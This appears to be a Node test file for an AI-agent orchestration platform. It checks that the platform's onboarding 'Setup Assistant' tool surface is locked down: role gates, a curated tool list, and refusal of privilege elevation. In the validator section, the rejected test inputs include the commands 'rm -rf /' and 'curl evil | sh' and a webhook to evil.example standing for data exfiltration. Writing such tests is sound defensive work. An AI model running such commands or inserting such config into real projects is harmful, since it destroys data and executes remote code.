import "./_guard.mjs"; // prod-guard: arms the Db backstop (sets LOOM_TEST=1; see _guard.mjs)
// Setup Assistant E1-3 — the ungated, user-facing onboarding assistant's CURATED, FAIL-CLOSED surface
// (mcp/setup.ts). DETERMINISTIC + CLAUDE-FREE + NETWORK-FREE, hermetic like audit-surface.mjs: a REAL Db
// + SessionService driven against a FAKE pty (PtyHost createPty() seam), the REAL routers driven over an
// in-process MCP InMemoryTransport (no HTTP, no external daemon). A real temp git repo backs project
// creation; the only thing faked is the claude pty.
//
// Proves the DoD:
//   (a) THE LOAD-BEARING SECURITY GOAL — a "setup" session gets the loom-setup surface, and the Platform,
//       Orchestration AND Audit routers' resolveRole() — the exact predicate each handle() 404s on —
//       return NULL for it. So a setup session can NEVER reach /mcp-platform, /mcp-orch, /mcp-audit.
//       Symmetrically, the setup router returns NULL for every NON-setup role (manager/worker/plain/
//       platform/auditor) — an agent/non-setup session can never reach /mcp-setup. buildMcpServers(setup)
//       mounts loom-setup ONLY (+loom-tasks), never platform/orch/audit, with a ["mcp__loom-setup"] allow.
//   (b) the surface is EXACTLY the curated subset — and NONE of the elevated/outward/self-improvement
//       tools (no git/vault/message/stop/schedule/archive/escalate/audit).
//   (c) the curated tools work end-to-end: project_create (real git repo), project_configure,
//       project_update, agent_create, profile_create/update/assign, list_all_*, session_spawn(manager|plain).
//   (d) THE VALIDATOR REJECTIONS — project_create/configure/update REJECT orchestration.gateCommand
//       (host-RCE) and alertWebhook (exfil) by construction (agent validator); session_spawn REFUSES
//       platform/auditor/worker/setup (no self-elevation) and creates nothing.
//
// Run: 1) build (turbo builds shared first), 2) node test/setup-surface.mjs
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execSync } from "node:child_process";

let failures = 0;
const check = (label, cond) => { console.log(`${cond ? "PASS" : "FAIL"}  ${label}`); if (!cond) failures++; };

// --- Hermetic LOOM_HOME + a sandboxed HOME. Set BEFORE importing dist (paths.ts reads LOOM_HOME at import). ---
const tmpHome = path.join(os.tmpdir(), `loom-setup-${Date.now()}-${process.pid}`);
fs.mkdirSync(path.join(tmpHome, "logs"), { recursive: true });
process.env.LOOM_HOME = tmpHome;
const sandboxHome = path.join(tmpHome, "home");
fs.mkdirSync(sandboxHome, { recursive: true });
process.env.USERPROFILE = sandboxHome; // Windows: os.homedir() reads USERPROFILE
process.env.HOME = sandboxHome;        // POSIX: os.homedir() reads HOME

import { requireHermeticEnv } from "./_guard.mjs";
requireHermeticEnv(); // confirm LOOM_HOME is the temp dir (no port — this test runs no HTTP daemon)

const { Db } = await import("../dist/db.js");
const { PtyHost, buildMcpServers } = await import("../dist/pty/host.js");
const { SessionService } = await import("../dist/sessions/service.js");
const { OrchestrationControl } = await import("../dist/orchestration/control.js");
const { SetupMcpRouter } = await import("../dist/mcp/setup.js");
const { PlatformMcpRouter } = await import("../dist/mcp/platform.js");
const { OrchestrationMcpRouter } = await import("../dist/mcp/orchestration.js");
const { AuditMcpRouter } = await import("../dist/mcp/audit.js");
const { resolveConfig } = await import("@loom/shared");
const { Client } = await import("@modelcontextprotocol/sdk/client/index.js");
const { InMemoryTransport } = await import("@modelcontextprotocol/sdk/inMemory.js");

// --- a real temp git repo so project_create has a valid repoPath (createPty is faked → no real claude) ---
const repo = path.join(os.tmpdir(), `loom-setup-repo-${Date.now()}`);
fs.mkdirSync(repo, { recursive: true });
fs.writeFileSync(path.join(repo, "README.md"), "# setup test repo\n");
execSync(`git init -q && git add . && git -c user.email=s@loom -c user.name=s commit -q -m init`, { cwd: repo });
const nonGit = path.join(os.tmpdir(), `loom-setup-nongit-${Date.now()}`);
fs.mkdirSync(nonGit, { recursive: true });

const now = new Date().toISOString();
const db = new Db();
// The reserved "Getting Started" home (E1-6 seeds this; here we just need a project to host the agents).
db.insertProject({ id: "pHome", name: "Getting Started", repoPath: repo, vaultPath: repo, config: {}, createdAt: now, archivedAt: null, reserved: true });
db.insertAgent({ id: "agentSetup", projectId: "pHome", name: "Setup Assistant", startupPrompt: "SETUP", position: 0, profileId: null });
db.insertAgent({ id: "agentMgr", projectId: "pHome", name: "Mgr", startupPrompt: "MGR", position: 1, profileId: null });

// Role-gate fixtures: one session per role.
const seedSession = (id, role) => db.insertSession({
  id, projectId: "pHome", agentId: "agentSetup", engineSessionId: null,
  title: null, cwd: repo, processState: "live", resumability: "unknown", busy: false,
  createdAt: now, lastActivity: now, lastError: null, role, parentSessionId: null,
});
seedSession("SETUP", "setup"); // the setup session under test (the loom-setup caller)
seedSession("M", "manager");
seedSession("W", "worker");
seedSession("P", null);   // plain
seedSession("PL", "platform");
seedSession("AUD", "auditor");

// Fake pty: capture createPty (spawn) calls; no real claude (mirrors audit-surface.mjs).
class SeamHost extends PtyHost {
  constructor(events) { super(events); this.spawned = []; }
  createPty(opts) { this.spawned.push(opts); return { pid: 4242, write() {}, onData() { return { dispose() {} }; }, onExit() { return { dispose() {} }; }, kill() {}, resize() {} }; }
  stop() {}
}
const events = {
  onEngineSessionId(id, eng) { db.setEngineSessionId(id, eng); },
  onBusy(id, busy) { db.setBusy(id, busy); },
  onContextStats() {}, onRateLimited() {},
  onExit(id) { db.setProcessState(id, "exited"); db.setBusy(id, false); },
};
const host = new SeamHost(events);
const svc = new SessionService(db, host, new OrchestrationControl());
const setupRouter = new SetupMcpRouter(db, svc);
const platformRouter = new PlatformMcpRouter(db, svc);
const orchRouter = new OrchestrationMcpRouter(db, svc);
const auditRouter = new AuditMcpRouter(db, svc);

const parse = (res) => JSON.parse(res.content[0].text);

try {
  // ============ (a) THE LOAD-BEARING SECURITY GOAL — role gates ============
  check("(a) setup router: setup session SETUP HAS the loom-setup surface (resolveRole truthy)", !!setupRouter.resolveRole("SETUP"));
  // Symmetric gate: every NON-setup role gets NULL from the setup router — an agent/non-setup session
  // can never reach /mcp-setup (resolveRole is the exact 404 predicate handle() uses).
  for (const id of ["M", "W", "P", "PL", "AUD"]) {
    check(`(a) setup router: non-setup session ${id} gets NO setup surface`, setupRouter.resolveRole(id) === null);
  }
  // THE PROOF: a setup session can NEVER reach the Lead's /mcp-platform, the manager/worker /mcp-orch,
  // NOR the auditor's /mcp-audit — each router's resolveRole is the exact 404 predicate.
  check("(a) PLATFORM router resolveRole(SETUP) === null → setup 404s on /mcp-platform", platformRouter.resolveRole("SETUP") === null);
  check("(a) ORCH router resolveRole(SETUP) === null → setup 404s on /mcp-orch", orchRouter.resolveRole("SETUP") === null);
  check("(a) AUDIT router resolveRole(SETUP) === null → setup 404s on /mcp-audit", auditRouter.resolveRole("SETUP") === null);
  // The surface map a setup session is spawned with: loom-setup ONLY (+ loom-tasks). No platform/orch/audit.
  const setupMcpMap = buildMcpServers({ sessionId: "SETUP", port: 4317, role: "setup" });
  check("(a) buildMcpServers(setup): mounts loom-setup", !!setupMcpMap["loom-setup"]);
  check("(a) buildMcpServers(setup): still has loom-tasks", !!setupMcpMap["loom-tasks"]);
  check("(a) buildMcpServers(setup): does NOT mount loom-platform", !setupMcpMap["loom-platform"]);
  check("(a) buildMcpServers(setup): does NOT mount loom-orchestration", !setupMcpMap["loom-orchestration"]);
  check("(a) buildMcpServers(setup): does NOT mount loom-audit", !setupMcpMap["loom-audit"]);

  // ============ (b) THE CURATED SURFACE — exactly the subset, none of the elevated tools ============
  const server = setupRouter.buildServer();
  const [clientT, serverT] = InMemoryTransport.createLinkedPair();
  await server.connect(serverT);
  const client = new Client({ name: "setup-e1-3-test", version: "0" });
  await client.connect(clientT);
  const call = async (name, args) => parse(await client.callTool({ name, arguments: args }));

  const tools = (await client.listTools()).tools.map((t) => t.name).sort();
  const expected = [
    "agent_create", "list_all_agents", "list_all_projects", "list_all_sessions",
    "profile_assign", "profile_create", "profile_update",
    "project_configure", "project_create", "project_update", "session_spawn",
  ];
  check(`(b) setup surface is EXACTLY the curated subset (got: ${tools.join(",")})`,
    JSON.stringify(tools) === JSON.stringify(expected));
  const forbidden = [
    "git_checkout", "git_create_branch", "git_commit", "git_push", "vault_write",
    "session_message", "session_stop", "schedule_create", "schedule_update", "project_archive",
    "platform_escalate", "audit_file_finding", "preset_suggestion_suggest", "worker_spawn", "daemon_restart",
  ];
  check("(b) setup surface has NONE of the elevated/outward/self-improvement tools",
    forbidden.every((t) => !tools.includes(t)));

  // ============ (c) the curated tools work end-to-end ============
  // project_create with a REAL git repo → created; vaultPath omitted → defaults to repoPath.
  const created = await call("project_create", { name: "MyProj", repoPath: repo });
  check("(c) project_create: returns a project with an id", !!created.id && !created.error);
  check("(c) project_create: vaultPath defaults to repoPath", created.vaultPath === repo);
  check("(c) project_create: persisted (db.getProject)", !!db.getProject(created.id) && db.getProject(created.id).reserved === false);
  // Guardrail: a non-git dir is rejected, nothing created.
  const nBefore = db.listAllProjects().length;
  const badRepo = await call("project_create", { name: "Bad", repoPath: nonGit });
  check("(c) project_create: a non-git repoPath is rejected", typeof badRepo.error === "string" && !badRepo.id);
  check("(c) project_create: the rejected create made NO project", db.listAllProjects().length === nBefore);

  // project_configure with a valid override (AGENT validator) → applied; resolveConfig reflects it.
  const cfg = { kanbanColumns: [{ key: "a", label: "A" }, { key: "b", label: "B" }] };
  const configured = await call("project_configure", { projectId: created.id, config: cfg });
  check("(c) project_configure: accepted (no error)", configured.ok === true && !configured.error);
  check("(c) project_configure: resolveConfig reflects the override",
    resolveConfig(db.getProject(created.id).config).kanbanColumns.length === 2);

  // project_update: name + vaultPath + config (all via the AGENT validator).
  const updated = await call("project_update", { projectId: created.id, name: "Renamed", vaultPath: repo, config: { docLint: true } });
  check("(c) project_update: name applied", updated.name === "Renamed" && !updated.error);
  check("(c) project_update: config applied (docLint)", resolveConfig(db.getProject(created.id).config).docLint === true);

  // agent_create under the new project.
  const agent = await call("agent_create", { projectId: created.id, name: "Worker", startupPrompt: "go" });
  check("(c) agent_create: returns an agent with an id", !!agent.id && !agent.error);
  check("(c) agent_create: persisted under the project + is NOT an endpoint", db.getAgent(agent.id)?.projectId === created.id && db.getAgent(agent.id)?.endpoint === false);
  const badAgentProfile = await call("agent_create", { projectId: created.id, name: "X", profileId: "nope" });
  check("(c) agent_create: a non-existent profileId is rejected", typeof badAgentProfile.error === "string" && !badAgentProfile.id);

  // profile_create / update / assign — the strict validateProfile is reused.
  const prof = await call("profile_create", { profile: { name: "Dev Rig", role: "worker", icon: "🛠️" } });
  check("(c) profile_create: returns a profile with an id", !!prof.id && prof.role === "worker" && !prof.error);
  const badProf = await call("profile_create", { profile: { name: "Bad", role: "auditor" } });
  check("(c) profile_create: an unmintable role (auditor) is rejected", typeof badProf.error === "string" && !badProf.id);
  const updProf = await call("profile_update", { profileId: prof.id, patch: { icon: "⚙️" } });
  check("(c) profile_update: partial patch applied", updProf.icon === "⚙️" && updProf.name === "Dev Rig" && !updProf.error);
  const assigned = await call("profile_assign", { agentId: agent.id, profileId: prof.id });
  check("(c) profile_assign: the profile is bound to the agent", assigned.profileId === prof.id && !assigned.error);
  const badAssign = await call("profile_assign", { agentId: "nope", profileId: prof.id });
  check("(c) profile_assign: an unknown agent is rejected", typeof badAssign.error === "string");

  // ============ (e) LEAST-PRIVILEGE: the ungated setup surface may NOT mint/edit an elevated-role rig ============
  // profile_create accepts manager|worker|setup|null, but REJECTS the elevated "platform"/"auditor" roles
  // (a default human spawn could otherwise silently elevate an agent carrying such a rig). The narrow
  // guard runs ON TOP of validateProfile (which is NOT loosened — it still allows "platform" for the
  // human REST + Platform Lead surfaces). nProfBefore proves a rejected create persists nothing.
  const nProfBefore = db.listProfiles().length;
  const platProf = await call("profile_create", { profile: { name: "PlatRig", role: "platform" } });
  check("(e) profile_create REJECTS role 'platform' (elevated, human-only)", typeof platProf.error === "string" && !platProf.id);
  const audProf = await call("profile_create", { profile: { name: "AuditRig", role: "auditor" } });
  check("(e) profile_create REJECTS role 'auditor' (elevated, human-only)", typeof audProf.error === "string" && !audProf.id);
  check("(e) the rejected profile_create(s) persisted NOTHING", db.listProfiles().length === nProfBefore);
  // The allowed roles all succeed (manager|worker|setup|null) — the assistant's core job is unbroken.
  const okMgr = await call("profile_create", { profile: { name: "MgrRig", role: "manager" } });
  const okWrk = await call("profile_create", { profile: { name: "WrkRig", role: "worker" } });
  const okSet = await call("profile_create", { profile: { name: "SetRig", role: "setup" } });
  const okNul = await call("profile_create", { profile: { name: "NulRig" } }); // role omitted ⇒ null
  check("(e) profile_create ACCEPTS role 'manager'", okMgr.role === "manager" && !okMgr.error);
  check("(e) profile_create ACCEPTS role 'worker'", okWrk.role === "worker" && !okWrk.error);
  check("(e) profile_create ACCEPTS role 'setup'", okSet.role === "setup" && !okSet.error);
  check("(e) profile_create ACCEPTS a role-null rig", okNul.role === null && !okNul.error);
  // profile_update must not be able to ELEVATE an existing rig to platform/auditor via the patch.
  const upElev = await call("profile_update", { profileId: okWrk.id, patch: { role: "platform" } });
  check("(e) profile_update REJECTS a patch that elevates role to 'platform'", typeof upElev.error === "string");
  check("(e) profile_update: the rejected elevate left the stored role UNCHANGED (still worker)", db.getProfile(okWrk.id)?.role === "worker");
  const upElevA = await call("profile_update", { profileId: okWrk.id, patch: { role: "auditor" } });
  check("(e) profile_update REJECTS a patch that elevates role to 'auditor'", typeof upElevA.error === "string" && db.getProfile(okWrk.id)?.role === "worker");
  // A non-role patch on the same rig still works (the guard only blocks the elevated role).
  const upOk = await call("profile_update", { profileId: okWrk.id, patch: { icon: "🔧" } });
  check("(e) profile_update still applies a non-role patch (icon)", upOk.icon === "🔧" && upOk.role === "worker" && !upOk.error);

  // reads.
  const projs = await call("list_all_projects", {});
  check("(c) list_all_projects: includes the created project", projs.some((p) => p.id === created.id));
  const agents = await call("list_all_agents", { projectId: created.id });
  check("(c) list_all_agents: narrows to the project", agents.length > 0 && agents.every((a) => a.projectId === created.id));
  const sess = await call("list_all_sessions", {});
  check("(c) list_all_sessions: returns the live session summaries", Array.isArray(sess) && sess.some((s) => s.id === "SETUP"));

  // session_spawn(manager|plain) → drives the (fake) pty.
  const nSpawnBefore = db.listAllSessions().length;
  const mgr = await call("session_spawn", { projectId: created.id, agentId: agent.id, role: "manager" });
  check("(c) session_spawn(manager): returns a live session", !!mgr.id && mgr.role === "manager" && !mgr.error);
  const plain = await call("session_spawn", { projectId: created.id, agentId: agent.id, role: "plain" });
  check("(c) session_spawn(plain): returns a role-null session", !!plain.id && plain.role == null && !plain.error);
  check("(c) session_spawn: drove the (fake) pty for both", host.spawned.some((o) => o.sessionId === mgr.id) && host.spawned.some((o) => o.sessionId === plain.id));
  check("(c) session_spawn: created exactly two sessions", db.listAllSessions().length === nSpawnBefore + 2);

  // ============ (d) THE VALIDATOR REJECTIONS — host-RCE / exfil keys are rejected by construction ============
  // project_create REJECTS gateCommand + alertWebhook (agent validator).
  const nRce = db.listAllProjects().length;
  const createGate = await call("project_create", { name: "Rce", repoPath: repo, config: { orchestration: { gateCommand: "rm -rf /" } } });
  check("(d) project_create REJECTS orchestration.gateCommand (host-RCE)", typeof createGate.error === "string" && !createGate.id);
  const createHook = await call("project_create", { name: "Exfil", repoPath: repo, config: { orchestration: { alertWebhook: { url: "https://evil.example", events: ["x"] } } } });
  check("(d) project_create REJECTS orchestration.alertWebhook (exfil)", typeof createHook.error === "string" && !createHook.id);
  check("(d) the rejected create(s) made NO project", db.listAllProjects().length === nRce);
  // project_configure REJECTS them too, and leaves the stored config unchanged.
  const cfgBefore = JSON.stringify(db.getProject(created.id).config);
  const configGate = await call("project_configure", { projectId: created.id, config: { orchestration: { gateCommand: "curl evil | sh" } } });
  check("(d) project_configure REJECTS orchestration.gateCommand", typeof configGate.error === "string" && !configGate.ok);
  const configHook = await call("project_configure", { projectId: created.id, config: { orchestration: { alertWebhook: { url: "https://evil.example", events: ["x"] } } } });
  check("(d) project_configure REJECTS orchestration.alertWebhook", typeof configHook.error === "string" && !configHook.ok);
  check("(d) the rejected configure(s) did NOT change the stored config", JSON.stringify(db.getProject(created.id).config) === cfgBefore);
  // project_update REJECTS them too.
  const updateGate = await call("project_update", { projectId: created.id, config: { orchestration: { gateCommand: "pwn" } } });
  check("(d) project_update REJECTS orchestration.gateCommand", typeof updateGate.error === "string");
  check("(d) the rejected update did NOT change the stored config", JSON.stringify(db.getProject(created.id).config) === cfgBefore);

  // session_spawn REFUSES every privileged/manager-owned role (no self-elevation).
  const nRefuse = db.listAllSessions().length;
  for (const role of ["platform", "auditor", "worker", "setup", "run", "bogus"]) {
    const r = await call("session_spawn", { projectId: created.id, agentId: agent.id, role });
    check(`(d) session_spawn REFUSES role "${role}"`, typeof r.error === "string" && !r.id);
  }
  check("(d) the refused spawns created NO session", db.listAllSessions().length === nRefuse);

  await client.close();
} finally {
  db.close();
  try { fs.rmSync(tmpHome, { recursive: true, force: true }); } catch { /* best-effort */ }
  try { fs.rmSync(repo, { recursive: true, force: true }); } catch { /* best-effort */ }
  try { fs.rmSync(nonGit, { recursive: true, force: true }); } catch { /* best-effort */ }
}

console.log(failures === 0
  ? "\n✅ ALL PASS — the Setup Assistant surface is the curated, fail-closed subset (project/agent/profile create+configure + manager|plain spawn + reads), a setup session 404s on /mcp-platform, /mcp-orch AND /mcp-audit, a non-setup session can never reach /mcp-setup, every config path rejects gateCommand/alertWebhook, and session_spawn refuses platform/auditor/worker/setup — claude-free, network-free."
  : `\n❌ ${failures} FAILURE(S).`);
process.exit(failures === 0 ? 0 : 1);
